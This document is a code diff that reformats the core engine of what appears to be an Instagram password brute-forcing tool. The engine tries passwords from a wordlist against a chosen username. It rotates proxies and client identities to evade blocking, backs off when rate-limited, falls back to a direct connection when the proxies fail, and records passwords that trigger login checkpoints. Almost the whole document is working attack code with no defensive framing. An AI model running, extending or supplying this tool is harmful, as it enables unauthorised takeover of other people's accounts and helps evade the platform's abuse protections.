@@ -1,38 +1,21 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """Brute — live progress + auto proxy failover."""
-
-import json
-import os
-import sys
-import time
-import random
+import json, os, sys, time, random
 from .api import InstagramAPI
 from .proxy import ProxyManager
 from .banner import info, ok, warn, err, C
 
 
 class BruteEngine:
-    def __init__(
-        self,
-        username,
-        wordlist_path,
-        output_dir="output",
-        delay_min=3.0,
-        delay_max=5.0,
-        proxy=None,
-        proxy_file=None,
-        resume=False,
-    ):
+    def __init__(self, username, wordlist_path, output_dir="output", delay_min=3.0, delay_max=5.0,
+                 proxy=None, proxy_file=None, resume=False):
         self.username = username.strip().lstrip("@")
         self.wordlist_path = wordlist_path
         self.output_dir = output_dir
         self.delay_min = float(delay_min)
         self.delay_max = float(delay_max)
-        self.proxy_mgr = ProxyManager(
-            proxy_file=proxy_file,
-            proxy_url=proxy,
-        )
+        self.proxy_mgr = ProxyManager(proxy_file=proxy_file, proxy_url=proxy)
         if self.proxy_mgr.count:
             info("Validating proxies...")
             self.proxy_mgr.validate_all()
@@ -55,24 +38,14 @@ class BruteEngine:
                 d = json.load(f)
             self._tried = set(d.get("tried", []))
             self._cursor = int(d.get("cursor", 0))
-            info(
-                f"Resume cursor={self._cursor} "
-                f"tried={len(self._tried)}"
-            )
+            info(f"Resume cursor={self._cursor} tried={len(self._tried)}")
         except Exception:
             pass
 
     def _save(self):
         try:
             with open(self.progress_file, "w", encoding="utf-8") as f:
-                json.dump(
-                    {
-                        "tried": list(self._tried)[-20000:],
-                        "cursor": self._cursor,
-                        "found": self._found,
-                    },
-                    f,
-                )
+                json.dump({"tried": list(self._tried)[-20000:], "cursor": self._cursor, "found": self._found}, f)
         except Exception:
             pass
 
@@ -88,27 +61,15 @@ class BruteEngine:
         bar_len = 18
         filled = int(bar_len * i / total) if total else 0
         bar = "█" * filled + "░" * (bar_len - filled)
-        pw = (
-            password
-            if len(password) <= 26
-            else password[:23] + "..."
-        )
-        line = (
-            f"\r{C.C}[{i}/{total}]{C.E} "
-            f"{C.G}{bar}{C.E} "
-            f"{pct:5.1f}% | {rate:4.2f}/s | "
-            f"ETA {eta_s} | "
-            f"pwd: {C.Y}{pw}{C.E}{extra}   "
-        )
+        pw = password if len(password) <= 26 else password[:23] + "..."
+        line = f"\r{C.C}[{i}/{total}]{C.E} {C.G}{bar}{C.E} {pct:5.1f}% | {rate:4.2f}/s | ETA {eta_s} | pwd: {C.Y}{pw}{C.E}{extra}   "
         sys.stdout.write(line)
         sys.stdout.flush()
 
     def run(self):
         passwords = []
         try:
-            with open(
-                self.wordlist_path, "r", encoding="utf-8", errors="ignore"
-            ) as f:
+            with open(self.wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
                 for line in f:
                     pw = line.strip()
                     if pw and pw not in self._tried:
@@ -126,10 +87,7 @@ class BruteEngine:
         info(f"Target     : @{self.username}")
         info(f"Passwords  : {total}")
         info(f"Already    : {len(self._tried)}")
-        info(
-            f"Delay      : {self.delay_min}-{self.delay_max}s | "
-            f"proxies alive: {self.proxy_mgr.alive_count}"
-        )
+        info(f"Delay      : {self.delay_min}-{self.delay_max}s | proxies alive: {self.proxy_mgr.alive_count}")
         print()
 
         start = time.time()
@@ -138,20 +96,16 @@ class BruteEngine:
             for password in passwords:
                 if self._found:
                     break
-
                 self._cursor += 1
                 done += 1
                 self._tried.add(password)
 
                 purl = self.proxy_mgr.get_next()
-
                 max_retries = 3
                 for attempt in range(max_retries):
                     self.api.set_proxy(purl if purl else None)
-
                     if done % 5 == 0 or attempt > 0:
                         self.api._rotate_identity()
-
                     result = self.api.try_login(self.username, password)
                     extra = ""
 
@@ -162,7 +116,6 @@ class BruteEngine:
                         break
 
                     st = result.get("status", "")
-
                     if st in ("timeout", "connection_error"):
                         if purl:
                             self.proxy_mgr.mark_dead(purl)
@@ -170,46 +123,35 @@ class BruteEngine:
                         purl = self.proxy_mgr.get_next()
                         if purl and attempt < max_retries - 1:
                             extra = f" | retry {attempt+2}/{max_retries}"
-                            self._progress(
-                                done, total, password, start, extra
-                            )
+                            self._progress(done, total, password, start, extra)
                             time.sleep(random.uniform(1, 2))
                             continue
                         else:
                             extra = " | all proxies dead — DIRECT"
                             self.api.set_proxy(None)
-                            result = self.api.try_login(
-                                self.username, password
-                            )
+                            result = self.api.try_login(self.username, password)
                             st = result.get("status", "")
                             break
 
                     if st == "checkpoint":
                         self._checkpoints.append(password)
                         try:
-                            with open(
-                                self.checkpoint_file, "a", encoding="utf-8"
-                            ) as cf:
+                            with open(self.checkpoint_file, "a", encoding="utf-8") as cf:
                                 cf.write(password + "\n")
                         except Exception:
                             pass
                         extra = f" | {C.Y}CHECKPOINT{C.E}"
                     elif st == "rate_limited":
                         extra = f" | {C.R}RATE-LIMIT{C.E}"
-                        self._progress(
-                            done, total, password, start, extra
-                        )
+                        self._progress(done, total, password, start, extra)
                         time.sleep(random.uniform(45, 100))
                     elif st == "invalid_user":
                         print()
                         err("Username invalid — stop")
                         break
-
                     if purl and st not in ("timeout", "connection_error"):
                         self.proxy_mgr.mark_alive(purl)
-
                     break
-
                 else:
                     extra = " | no proxy worked"
 
@@ -217,11 +159,9 @@ class BruteEngine:
                     break
 
                 self._progress(done, total, password, start, extra)
-
                 if done % 20 == 0:
                     self._save()
                     self.proxy_mgr.show_stats()
-
                 time.sleep(random.uniform(self.delay_min, self.delay_max))
 
         except KeyboardInterrupt:
